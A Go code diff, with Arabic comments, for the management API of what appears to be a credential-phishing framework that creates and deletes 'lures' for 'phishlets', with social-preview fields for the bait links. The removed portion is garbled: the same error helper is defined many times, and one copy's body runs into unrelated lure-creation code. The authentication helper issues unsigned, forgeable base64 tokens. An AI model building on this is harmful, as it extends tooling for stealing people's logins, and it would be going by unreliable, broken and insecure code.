@@ -201,11 +201,20 @@ func (as *ApiServer) getSessionHandler(w http.ResponseWriter, r *http.Request) {
 	json.NewEncoder(w).Encode(session)
 }
 
+// وظيفة مساعدة للرد بالخطأ
+func respondWithError(w http.ResponseWriter, code int, message string) {
+	w.Header().Set("Content-Type", "application/json")
+	w.WriteHeader(code)
+	json.NewEncoder(w).Encode(map[string]string{"error": message})
+}
+
+// وظيفة مساعدة للرد بالبيانات JSON
 func (as *ApiServer) jsonResponse(w http.ResponseWriter, resp ApiResponse) {
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(resp)
 }
 
+// وظيفة مساعدة للرد برسالة خطأ JSON
 func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode int) {
 	w.Header().Set("Content-Type", "application/json")
 	w.WriteHeader(statusCode)
@@ -218,13 +227,16 @@ func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode 
 	json.NewEncoder(w).Encode(resp)
 }
 
-// وظائف مساعدة للمصادقة
+// ================= وظائف مساعدة للمصادقة =================
+
+// إنشاء رمز بسيط
 func generateSimpleToken(username string) string {
 	timestamp := time.Now().Unix()
 	data := fmt.Sprintf("%s:%d", username, timestamp)
 	return base64.StdEncoding.EncodeToString([]byte(data))
 }
 
+// التحقق من صحة الرمز
 func validateSimpleToken(token string, expectedUsername string) bool {
 	data, err := base64.StdEncoding.DecodeString(token)
 	if err != nil {
@@ -248,211 +260,6 @@ func validateSimpleToken(token string, expectedUsername string) bool {
 	}
 	
 	return username == expectedUsername
-}
-
-// وظيفة مساعدة للرد بخطأ
-func respondWithError(w http.ResponseWriter, code int, message string) {
-	w.Header().Set("Content-Type", "application/json")
-	w.WriteHeader(code)
-	json.NewEncoder(w).Encode(map[string]string{"error": message})
-}
-
-// وظيفة مساعدة للرد بخطأ
-func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode int) {
-	w.Header().Set("Content-Type", "application/json")
-	w.WriteHeader(statusCode)
-	
-	resp := ApiResponse{
-		Success: false,
-		Message: errMsg,
-	}
-	
-	json.NewEncoder(w).Encode(resp)
-}
-
-// وظيفة مساعدة للرد بخطأ
-func (as *ApiServer) jsonResponse(w http.ResponseWriter, resp ApiResponse) {
-	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(resp)
-}
-
-// وظيفة مساعدة للرد بخطأ
-func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode int) {
-	w.Header().Set("Content-Type", "application/json")
-	w.WriteHeader(statusCode)
-	
-	resp := ApiResponse{
-		Success: false,
-		Message: errMsg,
-	}
-	
-	json.NewEncoder(w).Encode(resp)
-}
-
-// وظيفة مساعدة للرد بخطأ
-func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode int) {
-	w.Header().Set("Content-Type", "application/json")
-	w.WriteHeader(statusCode)
-	
-	resp := ApiResponse{
-		Success: false,
-		Message: errMsg,
-	}
-	
-	json.NewEncoder(w).Encode(resp)
-}
-
-// وظيفة مساعدة للرد بخطأ
-func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode int) {
-	w.Header().Set("Content-Type", "application/json")
-	w.WriteHeader(statusCode)
-	
-	resp := ApiResponse{
-		Success: false,
-		Message: errMsg,
-	}
-	
-	json.NewEncoder(w).Encode(resp)
-}
-
-// وظيفة مساعدة للرد بخطأ
-func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode int) {
-	w.Header().Set("Content-Type", "application/json")
-	w.WriteHeader(statusCode)
-	
-	resp := ApiResponse{
-		Success: false,
-		Message: errMsg,
-	}
-	
-	json.NewEncoder(w).Encode(resp)
-}
-
-// وظيفة مساعدة للرد بخطأ
-func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode int) {
-	w.Header().Set("Content-Type", "application/json")
-	w.WriteHeader(statusCode)
-	
-	resp := ApiResponse{
-		Success: false,
-		Message: errMsg,
-	}
-	
-	json.NewEncoder(w).Encode(resp)
-}
-
-// وظيفة مساعدة للرد بخطأ
-func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode int) {
-	w.Header().Set("Content-Type", "application/json")
-	w.WriteHeader(statusCode)
-	
-	resp := ApiResponse{
-		Success: false,
-		Message: errMsg,
-	}
-	
-	json.NewEncoder(w).Encode(resp)
-}
-
-// وظيفة مساعدة للرد بخطأ
-func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode int) {
-	w.Header().Set("Content-Type", "application/json")
-	w.WriteHeader(statusCode)
-	
-	resp := ApiResponse{
-		Success: false,
-		Message: errMsg,
-	}
-	
-	json.NewEncoder(w).Encode(resp)
-}
-
-// وظيفة مساعدة للرد بخطأ
-func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode int) {
-	w.Header().Set("Content-Type", "application/json")
-	w.WriteHeader(statusCode)
-	
-	resp := ApiResponse{
-		Success: false,
-		Message: errMsg,
-	}
-	
-	phishletName, ok := lureData["phishlet"].(string)
-	if !ok || phishletName == "" {
-		as.jsonError(w, "Phishlet name is required", http.StatusBadRequest)
-		return
-	}
-	
-	_, err = as.cfg.GetPhishlet(phishletName)
-	if err != nil {
-		as.jsonError(w, err.Error(), http.StatusBadRequest)
-		return
-	}
-	
-	hostname, _ := lureData["hostname"].(string)
-	path, _ := lureData["path"].(string)
-	
-	// Create a new lure with default settings
-	lure := &Lure{
-		Phishlet:        phishletName,
-		Hostname:        hostname,
-		Path:            path,
-		RedirectUrl:     "",
-		Redirector:      "",
-		UserAgentFilter: "",
-		Info:            "",
-		OgTitle:         "",
-		OgDescription:   "",
-		OgImageUrl:      "",
-		OgUrl:           "",
-		PausedUntil:     0,
-	}
-	
-	as.cfg.AddLure(phishletName, lure)
-	
-	// Find the ID of the lure we just added
-	var lureIndex int = -1
-	for i, l := range as.cfg.lures {
-		if l.Phishlet == phishletName && l.Hostname == hostname && l.Path == path {
-			lureIndex = i
-			break
-		}
-	}
-	
-	if lureIndex == -1 {
-		as.jsonError(w, "Failed to find created lure", http.StatusInternalServerError)
-		return
-	}
-	
-	lure, _ = as.cfg.GetLure(lureIndex)
-	
-	as.jsonResponse(w, ApiResponse{
-		Success: true,
-		Message: fmt.Sprintf("Created lure with ID: %d", lureIndex),
-		Data:    lure,
-	})
-}
-
-func (as *ApiServer) deleteLureHandler(w http.ResponseWriter, r *http.Request) {
-	vars := mux.Vars(r)
-	idStr := vars["id"]
-	
-	id, err := as.getLureId(idStr)
-	if err != nil {
-		as.jsonError(w, err.Error(), http.StatusBadRequest)
-		return
-	}
-	
-	err = as.cfg.DeleteLure(id)
-	if err != nil {
-		as.jsonError(w, err.Error(), http.StatusNotFound)
-		return
-	}
-	
-	as.jsonResponse(w, ApiResponse{
-		Success: true,
-		Message: fmt.Sprintf("Lure %d deleted", id),
-	})
 }
 
 // Config handler
@@ -480,23 +287,6 @@ func (as *ApiServer) getLureId(idStr string) (int, error) {
 	}
 	
 	return id, nil
-}
-
-func (as *ApiServer) jsonResponse(w http.ResponseWriter, resp ApiResponse) {
-	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(resp)
-}
-
-func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode int) {
-	w.Header().Set("Content-Type", "application/json")
-	w.WriteHeader(statusCode)
-	
-	resp := ApiResponse{
-		Success: false,
-		Message: errMsg,
-	}
-	
-	json.NewEncoder(w).Encode(resp)
 }
 
 // HTML لصفحة تسجيل الدخول
